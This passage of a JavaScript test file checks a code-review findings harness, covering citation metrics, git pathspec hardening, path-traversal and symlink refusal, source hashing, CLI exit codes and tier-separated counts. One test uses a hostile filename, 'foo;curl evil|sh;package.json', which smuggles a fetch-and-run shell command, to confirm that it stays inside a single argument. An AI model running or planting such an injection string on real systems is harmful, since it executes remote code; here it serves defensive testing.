      windowEntry({ unavailable: "no reviewer roster" }),
      windowEntry({ ok: false, error: "malformed" }),
      entryWith([baseRecord({ id: "f-1" })]),
    ]
    assert.equal(countByRule(window).reduce((sum, row) => sum + row.count, 0), 1)
  })

  it("unciteableRatio counts rejected pointers over rule-bearing records", () => {
    const root = rootWithStandards()
    const window = [
      entryWith([
        baseRecord({ id: "f-1" }),
        baseRecord({ id: "f-2", rule: "agent-os/standards/vue.md#no-such-anchor" }),
        baseRecord({ id: "f-3", class: "nit", summary: "no pointer at all" }),
      ]),
    ]
    assert.equal(unciteableRatio(window, { root }), 0.5)
  })
})

describe("citationCompetence / recallEstimate — the liveness probe (F1, C7/C8)", () => {
  const root = rootWithStandards()
  const rule = `${STANDARDS_FILE}#server-state-in-store`

  it("citationCompetence is the share of the paid reviewer's rule_violations the cheap reviewer also cited", () => {
    const paid = [baseRecord({ id: "p1" }), baseRecord({ id: "p2", rule: "agent-os/standards/vue.md#server-state-in-stores" })]
    const cheap = [baseRecord({ id: "c1" })]
    // p1 resolves and cheap cited it; p2 does not even resolve, so it cannot count for either side.
    assert.equal(citationCompetence(cheap, paid, { root }), 1)
  })

  it("citationCompetence returns null when the paid reviewer produced no resolvable citations", () => {
    const paid = [baseRecord({ id: "p1", rule: "agent-os/standards/vue.md#no-such-anchor" })]
    assert.equal(citationCompetence([], paid, { root }), null)
  })

  it("recallEstimate is the intersection over the paid set", () => {
    const paid = [baseRecord({ id: "p1", line: 10 }), baseRecord({ id: "p2", line: 20 })]
    const cheap = [baseRecord({ id: "c1", line: 10 })]
    assert.equal(recallEstimate(cheap, paid, { root }), 0.5)
  })
})

describe("the git port — pathspec magic cannot zero a path list (A9, A10, A11, review B6)", () => {
  it("runs every real git invocation under --literal-pathspecs (review B6)", () => {
    const { root, git: repoGit } = makeRepo()
    write(root, "a.md", "a")
    write(root, "b.md", "b")
    repoGit(["add", "."])
    // Without the flag, `:!a.md` is pathspec magic and ls-files returns b.md.
    // With it, the entry is a literal filename and nothing matches.
    const git = makeGit(root)
    const result = git.run(["ls-files", "--", ":!a.md"])
    assert.equal(result.ok, true)
    assert.equal(result.stdout.trim(), "", `pathspec magic leaked through: ${result.stdout}`)
  })

  it("reports a `:!*` path entry as a refusal, never a skip (review B6)", () => {
    const root = tempRoot()
    const result = validatePathEntries([":!*", "src/app.ts"], root)
    assert.equal(result.ok, false)
    assert.match(result.refusals[0], /pathspec magic refused/)
    assert.equal(result.paths.length, 1)
  })

  it("refuses a path that escapes the repository via resolveInsideRoot (review B6)", () => {
    const root = tempRoot()
    assert.equal(resolveInsideRoot(root, "../../other-repo/src"), null)
    const result = validatePathEntries(["../../other-repo/src"], root)
    assert.equal(result.ok, false)
    assert.match(result.refusals[0], /outside the repository/)
  })

  it("rejects a record whose file entry carries pathspec magic (review B6)", () => {
    const root = rootWithStandards()
    const result = validateRecord(baseRecord({ file: ":!src/app.vue" }), { root })
    assert.equal(result.ok, false)
    assert.match(result.errors.join(" "), /pathspec magic refused/)
  })

  it("passes a hostile filename to git as a single argv entry (A11)", () => {
    const calls = []
    const git = makeGit("/fake", {
      exec: (args) => {
        calls.push(args)
        return { ok: true, code: 0, stdout: "", stderr: "" }
      },
    })
    const hostile = "foo;curl evil|sh;package.json"
    git.diffPaths("abc123", [hostile])
    let seen = 0
    for (const argv of calls) {
      for (const arg of argv) {
        if (arg.includes(";curl")) {
          seen += 1
          assert.equal(arg, hostile, "the whole hostile name must live in ONE argv entry")
        }
      }
    }
    assert.ok(seen >= 1, "the hostile path should still reach git")
  })
})

describe("safeReadFile — a symlink is skipped, never read (A10, review M12)", () => {
  it("skips a directory instead of reading it", () => {
    const root = tempRoot()
    fs.mkdirSync(path.join(root, "sub"))
    const result = safeReadFile(root, "sub")
    assert.equal(result.ok, false)
    assert.match(result.reason, /not a regular file/)
  })

  it("skips a symlink to a file outside the repository (review M12)", (t) => {
    const root = tempRoot()
    const outside = path.join(tempRoot(), "secret.txt")
    write(outside, "", "PRIVATE")
    const link = path.join(root, "agent-os", "standards", "vue.md")
    fs.mkdirSync(path.dirname(link), { recursive: true })
    try {
      fs.symlinkSync(outside, link)
    } catch {
      t.skip("symlinks are not permitted in this environment (Windows without developer mode)")
      return
    }
    const result = safeReadFile(root, "agent-os/standards/vue.md")
    assert.equal(result.ok, false)
  })
})

describe("sourceHash — findings writes are invisible, standards writes are not (B10)", () => {
  it("a findings write does not change the source hash; a standards write does (review B8)", () => {
    const { root, git: repoGit } = makeRepo()
    write(root, "src/app.js", "export const x = 1\n")
    repoGit(["add", "."])
    repoGit(["commit", "-qm", "init"])

    const hash = (label) => sourceHash(root, { git: makeGit(root), fresh: true, thresholds: null })
    const before = hash("before")

    write(root, "docs/harness/findings/f.json", JSON.stringify({ findings: [] }))
    assert.equal(hash("after findings"), before, "findings are written after the gate; inside the hash every write would stale the fresh report")

    write(root, "agent-os/standards/x.md", "# Rule\n")
    assert.notEqual(hash("after standards"), before, "the rulebook stays inside the hash — removing its only remaining detection reproduces the **/auth/** TOCTOU")
  })
})

describe("CLI — exit codes and machine-readable output", () => {
  it("--validate exits 0 on a valid record and 1 on an invalid one", () => {
    const root = rootWithStandards()
    write(root, "ok.json", JSON.stringify(baseRecord()))
    write(root, "bad.json", JSON.stringify(baseRecord({ class: "opinion" })))
    assert.equal(runFindings(["--validate", "ok.json"], { root }).status, 0)
    assert.equal(runFindings(["--validate", "bad.json"], { root }).status, 1)
  })

  it("--validate validates a full envelope against its own manifest (review B10)", () => {
    const root = rootWithStandards()
    const envelope = {
      run: { label: "scheduler", spec: "x", tier: "full", sampled_files: null, gate_report: "docs/harness/quality/r.json", gate_source_hash: "abc123", base: "abc" },
      roster: [{ reviewer: "code-reviewer", model: MODEL, files: 14, sample: false }],
      manifest: baseManifest,
      findings: [baseRecord()],
    }
    write(root, "env.json", JSON.stringify(envelope))
    assert.equal(runFindings(["--validate", "env.json"], { root }).status, 0)
    const disagreeing = { ...envelope, findings: [baseRecord({ lane: "T99" })] }
    write(root, "env-bad.json", JSON.stringify(disagreeing))
    assert.equal(runFindings(["--validate", "env-bad.json"], { root }).status, 1)
  })

  it("--validate exits 2 (script blocker) for a file outside the repository", () => {
    const root = tempRoot()
    const result = runFindings(["--validate", "../../outside.json"], { root })
    assert.equal(result.status, 2)
  })

  it("--validate-ledger rejects a multiline text with exit 1 (review B4)", () => {
    const root = tempRoot()
    const ledger = { targets_allowed: ["agent-os/standards/"], rules: [{ id: "r1", text: "one\ntwo", target: "agent-os/standards/vue.md", anchor: "a", enforcement: "prose", provenance: { first_seen: "d", proposed_by: "p", approved_by: "operator", approved_at: "d", refuted_by: "r" } }], conflicts: [], retired: [] }
    write(root, "ledger.json", JSON.stringify(ledger))
    const result = runFindings(["--validate-ledger", "ledger.json"], { root })
    assert.equal(result.status, 1)
    assert.match(result.stdout, /single-line/)
  })

  it("--validate-ledger rejects an allowlist mutation with exit 1 (SEC-R1)", () => {
    const root = tempRoot()
    const ledger = { targets_allowed: ["src/"], rules: [], conflicts: [], retired: [] }
    write(root, "ledger.json", JSON.stringify(ledger))
    const result = runFindings(["--validate-ledger", "ledger.json"], { root })
    assert.equal(result.status, 1)
    assert.match(result.stdout, /may not be changed, emptied, extended or reordered/)
  })

  it("--validate-ledger rejects a dot-dot target with exit 1 (SEC-R1)", () => {
    const root = tempRoot()
    const ledger = {
      targets_allowed: ["agent-os/standards/"],
      rules: [
        {
          id: "r1",
          text: "keep it simple",
          target: "agent-os/standards/../../outside.md",
          anchor: "a",
          enforcement: "prose",
          provenance: { first_seen: "d", proposed_by: "p", approved_by: "operator", approved_at: "d", refuted_by: "r" },
        },
      ],
      conflicts: [],
      retired: [],
    }
    write(root, "ledger.json", JSON.stringify(ledger))
    const result = runFindings(["--validate-ledger", "ledger.json"], { root })
    assert.equal(result.status, 1)
    assert.match(result.stdout, /dot-dot segment/)
  })

  it("--window --json emits machine-readable grouped counts and reports malformed files", () => {
    const root = tempRoot()
    write(
      root,
      "docs/harness/findings/a.json",
      JSON.stringify({ run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc" }, roster: [{}], findings: [baseRecord()] }),
    )
    write(root, "docs/harness/findings/b.json", "{ nope")
    const result = runFindings(["--window", "5", "--json"], { root })
    assert.equal(result.status, 0)
    const output = JSON.parse(result.stdout)
    assert.equal(output.tier, "full")
    assert.equal(output.byRule.length, 1)
    assert.equal(output.byAgent[0].capability, "vue-engineer")
    const malformed = output.files.find((file) => file.file.endsWith("b.json"))
    assert.equal(malformed.ok, false)
    assert.match(malformed.error, /malformed/)
    // The malformed file is excluded from the countable population — and the exclusion is stated.
    assert.equal(output.crossTierExcluded.count, 1)
    const excluded = output.crossTierExcluded.files[0]
    assert.match(excluded.file, /b\.json/)
    assert.match(excluded.reason, /malformed/)
  })

  it("--window exits 0 with empty counts when no findings files exist", () => {
    const root = tempRoot()
    const result = runFindings(["--window", "3", "--json"], { root })
    assert.equal(result.status, 0)
    const output = JSON.parse(result.stdout)
    assert.deepEqual(output.byRule, [])
    assert.equal(output.tier, null)
    assert.equal(output.crossTierExcluded.count, 0)
  })

  it("--window --json emits the per-rule proposeBar block: weight, sessions, thresholds, eligible verdict (FINAL-R1)", () => {
    const root = tempRoot()
    const rulePtr = `${STANDARDS_FILE}#server-state-in-store`
    // Two operator notes (weight 3 each) across two distinct sessions: the bar is met.
    write(
      root,
      "docs/harness/findings/a.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "2026-08-12T09-00-00-scheduler" },
        roster: [{}],
        findings: [baseRecord({ id: "f-op1", class: "operator_note", rule: rulePtr, summary: "fixed by hand" })],
      }),
    )
    write(
      root,
      "docs/harness/findings/b.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "2026-08-13T09-00-00-scheduler" },
        roster: [{}],
        findings: [baseRecord({ id: "f-op2", class: "operator_note", rule: rulePtr, summary: "fixed by hand again" })],
      }),
    )
    withThresholds(root, { stage: 1, min_findings_to_propose: 3, min_sessions_to_propose: 2, operator_note_weight: 3 })
    const result = runFindings(["--window", "5", "--json"], { root })
    assert.equal(result.status, 0)
    const output = JSON.parse(result.stdout)
    assert.equal(output.proposeBar.min_findings_to_propose, 3)
    assert.equal(output.proposeBar.min_sessions_to_propose, 2)
    const row = output.proposeBar.rules.find((entry) => entry.rule === rulePtr)
    assert.ok(row, "proposeBar must include rules with weighted evidence even when no rule_violation was recorded")
    assert.equal(row.weightedEvidence, 6)
    assert.equal(row.distinctSessions, 2)
    assert.equal(row.eligible, true)
  })

  it("proposeBar marks a below-bar rule ineligible (FINAL-R1)", () => {
    const root = tempRoot()
    const rulePtr = `${STANDARDS_FILE}#server-state-in-store`
    write(root, STANDARDS_FILE, STANDARDS_TEXT)
    write(
      root,
      "docs/harness/findings/a.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "s1" },
        roster: [{}],
        findings: [baseRecord({ id: "f-1", rule: rulePtr })],
      }),
    )
    withThresholds(root, { stage: 1, min_findings_to_propose: 3, min_sessions_to_propose: 2, reviewer_finding_weight: 1 })
    const result = runFindings(["--window", "2", "--json"], { root })
    assert.equal(result.status, 0)
    const row = JSON.parse(result.stdout).proposeBar.rules.find((entry) => entry.rule === rulePtr)
    assert.equal(row.weightedEvidence, 1)
    assert.equal(row.distinctSessions, 1)
    assert.equal(row.eligible, false)
  })
})

describe("FINAL-R2 — derived counts never mix tiers (T07 §6, A18)", () => {
  it("newestTier anchors on the newest AVAILABLE file and countableWindow keeps only its tier", () => {
    const full = windowEntry({ file: "docs/harness/findings/full.json" })
    const sampling = windowEntry({
      file: "docs/harness/findings/sampling.json",
      data: { ...windowEntry().data, run: { ...windowEntry().data.run, tier: "sampling" } },
    })
    // readWindow orders newest first, so the first countable entry is the anchor.
    assert.equal(newestTier([full, sampling]), "full")
    assert.deepEqual(countableWindow([full, sampling]), [full])
    assert.equal(newestTier([sampling, full]), "sampling")
    assert.deepEqual(countableWindow([sampling, full]), [sampling])
  })

  it("a single-tier window is unchanged — every available file counts (FINAL-R2)", () => {
    const a = windowEntry({ file: "docs/harness/findings/a.json" })
    const b = windowEntry({ file: "docs/harness/findings/b.json" })
    assert.equal(newestTier([a, b]), "full")
    assert.deepEqual(countableWindow([a, b]), [a, b])
  })

  it("no available file recording a tier refuses the countable population — never guessed (FINAL-R2)", () => {
    const noTier = windowEntry({
      data: { ...windowEntry().data, run: { label: "scheduler", gate_report: "r.json", gate_source_hash: "abc" } },
    })
    assert.equal(newestTier([noTier]), null)
    assert.deepEqual(countableWindow([noTier]), [])
    assert.match(exclusionReasonOf(noTier), /no recorded tier/)
  })

  it("an older different-tier finding cannot change counts, weights, sessions or eligibility (FINAL-R2)", () => {
    const root = tempRoot()
    const rulePtr = `${STANDARDS_FILE}#server-state-in-store`
    // Newest file: full tier, one reviewer finding (weight 1, one session).
    write(
      root,
      "docs/harness/findings/2026-08-12T00-00-00-full.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "s-new" },
        roster: [{}],
        findings: [baseRecord({ id: "f-new", rule: rulePtr })],
      }),
    )
    // Older file: sampling tier — if mixed in, its operator note (weight 3) would push
    // the rule to weight 4 over 2 sessions and flip eligible false → true.
    write(
      root,
      "docs/harness/findings/2026-08-11T00-00-00-sampling.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "sampling", gate_report: "r.json", gate_source_hash: "abc", session: "s-old" },
        roster: [{}],
        findings: [baseRecord({ id: "f-old", class: "operator_note", rule: rulePtr, summary: "fixed by hand" })],
      }),
    )
    withThresholds(root, { stage: 1, min_findings_to_propose: 3, min_sessions_to_propose: 2, operator_note_weight: 3, reviewer_finding_weight: 1 })
    const result = runFindings(["--window", "5", "--json"], { root })
    assert.equal(result.status, 0)
    const output = JSON.parse(result.stdout)
    assert.equal(output.tier, "full")
    assert.equal(output.crossTierExcluded.count, 1)
    assert.match(output.crossTierExcluded.reason, /counted 1 file\(s\) at tier full; 1 file\(s\) excluded — cross-tier comparison refused/)
    const excluded = output.crossTierExcluded.files[0]
    assert.match(excluded.file, /sampling\.json/)
    assert.match(excluded.reason, /other tier \(sampling\)/)
    // The sampling file's operator note is invisible to EVERY derived output.
    const row = output.proposeBar.rules.find((entry) => entry.rule === rulePtr)
    assert.equal(row.weightedEvidence, 1)
    assert.equal(row.distinctSessions, 1)
    assert.equal(row.eligible, false)
    assert.equal(output.byRule.find((entry) => entry.rule === rulePtr).count, 1)
  })

  it("two same-tier files still count together — single-tier behavior retained (FINAL-R2)", () => {
    const root = tempRoot()
    const rulePtr = `${STANDARDS_FILE}#server-state-in-store`
    write(
      root,
      "docs/harness/findings/a.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "s1" },
        roster: [{}],
        findings: [baseRecord({ id: "f-1", rule: rulePtr })],
      }),
    )
    write(
      root,
      "docs/harness/findings/b.json",
      JSON.stringify({
        run: { label: "scheduler", tier: "full", gate_report: "r.json", gate_source_hash: "abc", session: "s2" },
        roster: [{}],
        findings: [baseRecord({ id: "f-2", rule: rulePtr })],
      }),
    )
    withThresholds(root, { stage: 1, min_findings_to_propose: 3, min_sessions_to_propose: 2, reviewer_finding_weight: 1 })
    const result = runFindings(["--window", "5", "--json"], { root })
    assert.equal(result.status, 0)
    const output = JSON.parse(result.stdout)
    assert.equal(output.tier, "full")
    assert.equal(output.crossTierExcluded.count, 0)
    const row = output.proposeBar.rules.find((entry) => entry.rule === rulePtr)
    assert.equal(row.weightedEvidence, 2)
    assert.equal(row.distinctSessions, 2)
    assert.equal(output.byRule.find((entry) => entry.rule === rulePtr).count, 2)
  })
})

describe("the test wiring itself (B1)", () => {
  it("package.json's test script runs this file (review B1)", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(REPO_ROOT, "package.json"), "utf8"))
    assert.match(pkg.scripts.test, /tests\/harness-continual-harness\.test\.mjs/)
  })
})

describe("A23 sentinel — harness-continual-harness.test.mjs was loaded by npm test (review B1)", () => {
  it("A23 sentinel: harness-continual-harness.test.mjs was loaded by npm test (review B1)", () => {
    assert.ok(true)
  })
})
